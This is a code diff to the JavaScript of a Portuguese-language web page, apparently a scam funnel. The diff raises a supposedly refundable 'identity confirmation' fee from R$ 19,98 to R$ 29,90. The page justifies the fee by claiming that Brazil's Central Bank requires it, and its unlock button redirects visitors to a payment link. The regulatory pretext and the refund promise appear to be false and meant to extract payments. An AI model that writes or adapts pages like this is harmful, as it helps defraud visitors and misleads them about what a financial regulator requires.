@@ -121,7 +121,7 @@ const pages = {
         </div
         
         <p class="registration-description">
-          Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de R$ 19,98 para garantir a autenticidade dos participantes.
+          Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de R$ 29,90 para garantir a autenticidade dos participantes.
         </p>
         
         <p class="refund-info">
@@ -141,7 +141,7 @@ const pages = {
             <div class="info-icon">🔄</div>
             <div class="info-text">
               <h3>Valor reembolsável</h3>
-              <p>Você recebe os R$ 19,98 de volta após finalizar.</p>
+              <p>Você recebe os R$ 29,90 de volta após finalizar.</p>
             </div>
           </div>
           
@@ -289,7 +289,7 @@ function setupRegistrationPage() {
 // Setup event listeners for video page
 function setupVideoPage() {
   document.querySelector('.unlock-btn').addEventListener('click', () => {
-    window.location.href = 'https://go.tribopay.com.br/jox2w4ocgw';
+    window.location.href = 'https://go.tribopay.com.br/rumhw';
   });
 
 }
